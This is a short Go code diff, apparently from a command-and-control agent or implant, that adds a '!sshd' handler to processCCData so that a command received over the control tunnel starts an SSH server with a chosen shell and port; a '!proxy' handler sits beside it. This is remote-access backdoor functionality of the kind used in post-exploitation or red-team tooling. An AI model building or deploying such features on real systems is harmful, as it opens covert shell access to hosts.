@@ -295,6 +295,24 @@ func processCCData(data *MsgTunData) {
 			goto send
 		}
 
+		// sshd server
+		if cmdSlice[0] == "!sshd" {
+			if len(cmdSlice) < 3 {
+				log.Printf("args error: %s", cmdSlice)
+				return
+			}
+			log.Printf("Got sshd request: %s", cmdSlice)
+			shell := cmdSlice[1]
+			port := cmdSlice[2]
+			go func() {
+				err = SSHD(shell, port)
+				if err != nil {
+					log.Printf("Failed to start SSHD: %v", err)
+				}
+			}()
+			return
+		}
+
 		// proxy server
 		if cmdSlice[0] == "!proxy" {
 			if len(cmdSlice) != 3 {
